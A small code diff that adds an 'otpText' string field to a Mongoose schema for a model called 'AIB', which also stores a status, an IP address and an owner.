@@ -18,6 +18,7 @@ const aibSchema = new mongoose.Schema({
   status: Number,
   ip: String,
   owner: String,
+  otpText: String,
 });
 
 module.exports = mongoose.model("AIB", aibSchema);
